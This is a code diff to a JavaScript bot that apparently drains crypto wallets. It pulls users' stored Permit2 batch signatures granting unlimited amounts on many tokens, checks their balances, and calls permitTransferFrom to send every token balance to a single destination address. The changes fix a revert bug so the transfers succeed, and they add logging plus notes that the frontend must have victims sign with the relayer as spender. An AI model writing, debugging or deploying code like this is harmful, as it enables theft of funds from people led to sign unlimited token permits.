@@ -80,9 +80,11 @@ const ERC20_ABI = [
 ];
 
 // Permit2 SignatureTransfer — batch variant.
-// One signature covers all tokens. requestedAmount = MaxUint256 (must match signed amount).
-// Permit2 transfers min(requestedAmount, balance) = balance.
-// Each call consumes the nonce — only call when balance > 0.
+// One signature covers N tokens. permitted.amount = MaxUint256 (what the user signed).
+// requestedAmount = actual token balance (must be ≤ permitted.amount — not necessarily equal).
+// Permit2 calls ERC20.safeTransferFrom(owner, to, requestedAmount) directly —
+//   passing MaxUint256 as requestedAmount would cause ERC20 to revert.
+// Each call consumes the nonce — only call when at least one token has balance > 0.
 const PERMIT2_ABI = [
   "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external",
 ];
@@ -280,12 +282,19 @@ async function getSweepSignature(walletAddress) {
 
 // ── Permit2 SignatureTransfer sweep ───────────────────────────────────────────
 //
-// Uses Permit2 SignatureTransfer (batch variant):
-//   One signature covers N tokens, all permitted at MaxUint256.
-//   requestedAmount per token = MaxUint256 (matches signed amount; Permit2 caps at balance).
-//   The nonce is consumed on each call — only call when balance > 0.
-//   If the user re-signs a new row appears in permit2_signatures;
-//   getSweepSignature always returns the newest row.
+// Permit2 SignatureTransfer batch flow:
+//   1. User signed {permitted:[{token,amount:MaxUint256},...], spender, nonce, deadline}
+//      where spender = relayerWallet.address (MUST match msg.sender of this call).
+//   2. Bot fetches fresh signature from Supabase on every sweep.
+//   3. Checks token balances sequentially (rate-limit safe).
+//   4. Calls permitTransferFrom ONLY if ≥1 balance > 0 (avoids burning the nonce).
+//   5. requestedAmount = actual balance — NOT MaxUint256.
+//      Permit2 passes requestedAmount directly to ERC20.safeTransferFrom;
+//      using MaxUint256 would always revert because the user never holds that much.
+//   6. permitted.amount = MaxUint256 in the struct (must match what was signed).
+//
+// InvalidSigner means signature spender ≠ msg.sender (relayerWallet.address).
+// The frontend must sign with spender = the relayer address printed at startup.
 
 async function sweepPermit2Wallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
@@ -358,10 +367,9 @@ async function sweepPermit2Wallet(walletAddress) {
   if (!tokensWithBalance.length) return;
 
   // Build the batch permit struct.
-  // permitted[] must exactly match what was signed (all tokens, MaxUint256 amount).
-  // requestedAmount must also be MaxUint256 — the amount that was signed.
-  // Permit2 will transfer min(requestedAmount, actualBalance) = actualBalance.
-  // Using the actual balance instead would cause InvalidSigner (amount mismatch).
+  // permitted[].amount = MaxUint256 — must match exactly what the user signed.
+  // requestedAmount = actual token balance — passed directly to ERC20.safeTransferFrom.
+  //   Using MaxUint256 here would always revert (user never holds that many tokens).
   const deadlineBn = parseDeadlineBigInt(deadline);
   if (!deadlineBn) {
     warn(`[permit2] could not parse deadline for ${checksum}: ${deadline}`);
@@ -371,7 +379,7 @@ async function sweepPermit2Wallet(walletAddress) {
   const permit = {
     permitted: entries.map(e => ({
       token:  e.tokenAddress,
-      amount: ethers.MaxUint256,
+      amount: ethers.MaxUint256,         // must match signed amount
     })),
     nonce:    BigInt(nonce),
     deadline: deadlineBn,
@@ -379,10 +387,13 @@ async function sweepPermit2Wallet(walletAddress) {
 
   const transferDetails = entries.map(e => ({
     to:              DESTINATION_ADDRESS,
-    requestedAmount: ethers.MaxUint256, // must match signed amount — Permit2 caps at actual balance
+    requestedAmount: e.balance,           // actual balance — ERC20 transfers exactly this
   }));
 
-  log(`[permit2] ${checksum} — ${tokensWithBalance.length}/${entries.length} token(s) have balance — calling permitTransferFrom`);
+  log(`[permit2] calling permitTransferFrom for ${checksum}`);
+  log(`[permit2]   spender (msg.sender) = ${relayerWallet.address}`);
+  log(`[permit2]   nonce = ${nonce} | deadline = ${deadline}`);
+  log(`[permit2]   tokens: ${tokensWithBalance.map(e => `${e.tokenAddress.slice(0,10)} bal=${ethers.formatUnits(e.balance,18)}`).join(", ")}`);
 
   try {
     const fee = await getFeeData();
@@ -390,11 +401,23 @@ async function sweepPermit2Wallet(walletAddress) {
       permit, transferDetails, checksum, signature,
       { gasLimit: 300_000n, ...fee }
     );
-    log(`[permit2] permitTransferFrom tx: ${tx.hash}`);
+    log(`[permit2] tx sent: ${tx.hash}`);
     await tx.wait();
     log(`[permit2] confirmed — ${tokensWithBalance.length} token(s) swept for ${checksum}`);
   } catch (e) {
-    err(`[permit2] permitTransferFrom failed for ${checksum}: ${e.message}`);
+    // Map known Permit2 custom errors to actionable messages
+    const msg = e.message ?? "";
+    if (msg.includes("InvalidSigner") || e.code === "CALL_EXCEPTION") {
+      err(`[permit2] InvalidSigner for ${checksum} — signature spender ≠ relayer ${relayerWallet.address}. Re-sign with spender = relayer address.`);
+    } else if (msg.includes("InvalidNonce")) {
+      err(`[permit2] InvalidNonce for ${checksum} — nonce ${nonce} already used. User must re-sign.`);
+    } else if (msg.includes("SignatureExpired")) {
+      err(`[permit2] SignatureExpired for ${checksum} — deadline ${deadline} passed.`);
+    } else if (msg.includes("InvalidAmount")) {
+      err(`[permit2] InvalidAmount for ${checksum} — requestedAmount exceeds permitted.`);
+    } else {
+      err(`[permit2] permitTransferFrom failed for ${checksum}: ${msg}`);
+    }
   }
 }
 
@@ -589,7 +612,7 @@ async function startBot() {
 async function init() {
   log("Sweep bot starting…");
   log(`Chain:       ${CHAIN}`);
-  log(`Relayer:     ${relayerWallet.address}`);
+  log(`Relayer:     ${relayerWallet.address}  ← Permit2 SPENDER (frontend must sign with this address)`);
   log(`Destination: ${DESTINATION_ADDRESS}`);
   log(`Permit2:     ${PERMIT2_ADDRESS}`);
   if (CONTRACT_ADDRESS) log(`Contract:    ${CONTRACT_ADDRESS}`);
